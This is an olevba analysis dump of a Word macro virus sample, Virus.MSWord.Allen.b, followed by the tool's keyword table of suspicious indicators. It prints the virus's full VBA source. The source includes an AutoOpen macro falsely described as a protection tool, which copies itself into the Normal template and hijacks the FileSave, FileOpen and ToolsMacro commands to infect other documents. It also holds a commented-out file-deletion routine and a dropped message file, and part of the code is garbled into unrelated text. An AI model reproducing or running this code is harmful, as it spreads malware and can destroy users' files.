olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Allen.b-4b875ddbbeefc21e18df8facd15f7d8d0a0dc431
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Allen.b-4b875ddbbeefc21e18df8facd15f7d8d0a0dc431 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Allen.b-4b875ddbbeefc21e18df8facd15f7d8d0a0dc431 - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "ScanProt macro to install protection macros, disinfect your Normal (Global) template and run the CleanAll macro."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
Dim sMe$
Dim sMacro$
On Error GoTo -1: On Error GoTo Abort
    sMe$ = WordBasic.[FileName$]()
    sMacro$ = sMe$ + ":RpAE"
    WordBasic.MacroCopy sMacro$, "Global:Autoexec"
    sMacro$ = sMe$ + ":RpAE"
    WordBasic.MacroCopy sMacro$, "Global:RpAE"
    sMacro$ = sMe$ + ":AutoOpen"
    WordBasic.MacroCopy sMacro$, "Global:RpAO"
    sMacro$ = sMe$ + ":RpFS"
    WordBasic.MacroCopy sMacro$, "Global:FileSave"
    sMacro$ = sMe$ + ":RpFS"
    WordBasic.MacroCopy sMacro$, "Global:RpFS"
    sMacro$ = sMe$ + ":RpFSA"
    WordBasic.MacroCopy sMacro$, "Global:FileSaveAs"
    sMacro$ = sMe$ + ":RpFSA"
    WordBasic.MacroCopy sMacro$, "Global:RpFSA"
    sMacro$ = sMe$ + ":RpFO"
    WordBasic.MacroCopy sMacro$, "Global:FileOpen"
    sMacro$ = sMe$ + ":RpFO"
    WordBasic.MacroCopy sMacro$, "Global:RpFO"
    sMacro$ = sMe$ + ":RpTC"
    WordBasic.MacroCopy sMacro$, "Global:ToolsCustomize"
    sMacro$ = sMe$ + ":RpTM"
    WordBasic.MacroCopy sMacro$, "Global:ToolsMacro"
Abort:
End Sub
-------------------------------------------------------------------------------
VBA MACRO RpFSA.bas 
in file: Virus.MSWord.Allen.b-4b875ddbbeefc21e18df8facd15f7d8d0a0dc431 - OLE stream: 'Macros/VBA/RpFSA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves a copy of the document in a separate file"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.RpFSA.MAIN"
Dim sMe$
Dim sTMacro$
On Error GoTo -1: On Error GoTo Bail
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg

If dlg.Format = 0 Then dlg.Format = 1
WordBasic.FileSaveAs dlg
sMe$ = WordBasic.[FileName$]()
sTMacro$ = sMe$ + ":RpAE"
WordBasic.MacroCopy "Global:RpAE", sTMacro$
sTMacro$ = sMe$ + ":AutoOpen"
WordBasic.MacroCopy "Global:RpAO", sTMacro$
sTMacro$ = sMe$ + ":RpFS"
WordBasic.MacroCopy "Global:RpFS", sTMacro$
sTMacro$ = sMe$ + ":RpFO"
WordBasic.MacroCopy "Global:RpFO", sTMacro$
sTMacro$ = sMe$ + ":RpTC"
WordBasic.MacroCopy "Global:ToolsCustomize", sTMacro$
sTMacro$ = sMe$ + ":RpTM"
WordBasic.MacroCopy "Global:ToolsMacro", sTMacro$
sTMacro$ = sMe$ + ":RpFSA"
WordBasic.MacroCopy "Global:RpFSA", sTMacro$
GoTo Done

Bail:
If Err.Number <> 102 Then
    WordBasic.FileSaveAs dlg
End If
Done:
End Sub
-------------------------------------------------------------------------------
VBA MACRO RpFS.bas 
in file: Virus.MSWord.Allen.b-4b875ddbbeefc21e18df8facd15f7d8d0a0dc431 - OLE stream: 'Macros/VBA/RpFS'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves the active document or template"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.RpFS.MAIN"
Dim sMe$
Dim sTMacro$
WordBasic.FileSave
On Error GoTo -1: On Error GoTo Bail

Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
WordBasic.FileSaveAs dlg
sMe$ = WordBasic.[FileName$]()
sTMacro$ = sMe$ + ":RpAE"
WordBasic.MacroCopy "Global:RpAE", sTMacro$
sTMacro$ = sMe$ + ":AutoOpen"
WordBasic.MacroCopy "Global:RpAO", sTMacro$
sTMacro$ = sMe$ + ":RpFS"
WordBasic.MacroCopy "Global:RpFS", sTMacro$
sTMacro$ = sMe$ + ":RpTC"
WordBasic.MacroCopy "Global:ToolsCustomize", sTMacro$
sTMacro$ = sMe$ + ":RpTM"
WordBasic.MacroCopy "Global:ToolsMacro", sTMacro$
sTMacro$ = sMe$ + ":RpFSA"
WordBasic.MacroCopy "Global:RpFSA", sTMacro$
GoTo Done
Bail:
If Err.Number <> 102 Then
    WordBasic.FileSaveAs dlg
End If
Done:
End Sub
-------------------------------------------------------------------------------
VBA MACRO RpFO.bas 
in file: Virus.MSWord.Allen.b-4b875ddbbeefc21e18df8facd15f7d8d0a0dc431 - OLE stream: 'Macros/VBA/RpFO'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim sMe$
Dim sTMacro$
On Error GoTo -1: On Error GoTo Bail
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
WordBasic.CurValues.FileOpen dlg
WordBasic.Dialog.FileOpen dlg

WordBasic.FileOpen dlg
sMe$ = WordBasic.[FileName$]()
sTMacro$ = sMe$ + ":RpAE"
WordBasic.MacroCopy "Global:RpAE", sTMacro$
sTMacro$ = sMe$ + ":AutoOpen"
WordBasic.MacroCopy "Global:RpAO", sTMacro$
sTMacro$ = sMe$ + ":RpFS"
WordBasic.MacroCopy "Global:RpFS", sTMacro$
sTMacro$ = sMe$ + ":RpFO"
WordBasic.MacroCopy "Global:RpFO", sTMacro$
sTMacro$ = sMe$ + ":RpTC"
WordBasic.MacroCopy "Global:ToolsCustomize", sTMacro$
sTMacro$ = sMe$ + ":RpTM"
WordBasic.MacroCopy "Global:ToolsMacro", sTMacro$
sTMacro$ = sMe$ + ":RpFSA"
WordBasic.MacroCopy "Global:RpFSA", sTMacro$
WordBasic.MsgBox "Thank's for joining with us !", "@Rapi.Kom"
GoTo Done
Bail:
If Err.Number <> 102 Then
    WordBasic.FileOpen dlg
End If
Done:
End Sub
-------------------------------------------------------------------------------
VBA MACRO RpAE.bas 
in file: Virus.MSWord.Allen.b-4b875ddbbeefc21e18df8facd15f7d8d0a0dc431 - OLE stream: 'Macros/VBA/RpAE'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim tgl$
Dim tgl_
Dim tahun$
Dim tahun_
Dim Semua$
Dim hari$
Dim bulan$
Dim pukul$
Dim Bacalah$
'tgl = Day(Now())
'jam = Hour(Now())
'If tgl < 20 Then Goto Selamat
'If jam < 11 Then Goto Selamat
'Dim Sehat$(20)
'Dim Subur$(20)
'ChDir "C:\"
'Dim subdirs$(CountDirectories())
'subdirs$(0) = "[..]"
'For i = 1 To CountDirectories()
'   Print "Reading menu...Please wait !"
'   Subdirs$(i) = UCase$(GetDirectory$(i))
'   If Subdirs$(i) = "WINDOWS" Then Goto lewat
'   If Subdirs$(i) = "WINWORD" Then Goto lewat
'   If Subdirs$(i) = "WINWORD6" Then Goto lewat
'   Ojek$ = "C:\" + Subdirs$(i) + "\*.*"
'   Kill ojek$
'   ChDir  Subdirs$(i)
'       Subur$(0) = "[..]"
'       For a = 1 To CountDirectories()
'           Print "Reading menu...Please wait !"
'           subur$(a) = UCase$(GetDirectory$(a))
'           If subur$(a) = "WINWORD" Then Goto pass
'           If subur$(a) = " WINWORD6" Then Goto pass
'           Penyakit$ = "C:\" + subdirs$(i) + "\" + subur$(a) + "\*.*"
'           Kill Penyakit Else / CheckDialog Single Integer WordBasic.Input Double Private Declare Private Declare Lib Else Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let /
                                ; Double Alias 'ks ..........................................................................   70"&chr(13)&"   BAB V   :   PEMBAHA Private Declare Lib Else Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let / WordBasic.Input Is <> / / / / Private Declare Let Else Private Declare                                                                                                 29545  Else
29537  Else

gan XRD ............................................................    72"&chr(13)&"               B. Mekanisme penyusutan serbuk komREMk selama sintering ............    73"&chr(13)&"           C. Faktor-faktor yang menentukan densitas prbulan
l

tgl$ = Str(tgl_)
tahun$ = Str(tahun_)
Semua$ = hari$ + ", " + tgl$ + " " + bulan$ + " " + tahun$ + ", Jam :" + pukul$ + "."
'Pesan$ = "Anda rupanya sedang sial, semua file di mesin ini kecuali yang berada di direktori WINDOWS dan WINWORD telah hilang, jangan kaget, ini bukan ulah Anda, tapi ini hasil pekerjaan saya...Barang siapa yang berhasil menemukan cara menangkal virus ini
', saya aka" + "n memberi listing virus ini untuk Anda !!! Dan tentu saja saya akan terus datang kesini untuk memberi Anda salam dengan virus-virus terbaru dari saya...selamat !   Bandung, " + semua$
Bacalah$ = "Assalamualaikum ..., maaf @Rapi.Kom mengganggu anda sebentar. Pesan ini aslinya bernama  PESAN.TXT  yang  muncul  di  root direktori  setelah  anda menjalankan Winword 6.0 yang templatenya (normal.dot)  telah  tertulari  macro  menjijikkan ini. Macro ini " + "(sebe" + "lum @R" + "a" + "pi" + ".Kom modifikasi)  berasal  dari  file data Winword 6.0 (*.doc) yang telah tertular macro ini. Bila file data tersebut  di pangggil (Open doc), maka macro secara otomatis menjalankan perintah-perintah macro lain nya,  yang antara  lain mengcopykan  diri ke" + " gl" + "o" + "bal " + "template (normal.dot), juga pada tanggal dan jam tertentu akan menghapus semua data di direktori tingkat 1, 2 dan 3 (kecuali Hidden direktori), menjengkelkan bukan ?!. Siapapun pembuatnya pastilah orang yang sirik !,  masih banyak perbuatan baik lain yang" + "  bisa  kita kerjakan.         ... Malang, " + Semua$ + " @Rapi.Kom"
Open "C:\BACALAH.TXT" For Output As 1
Write #1, Bacalah$
Close 1
'Selamat:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

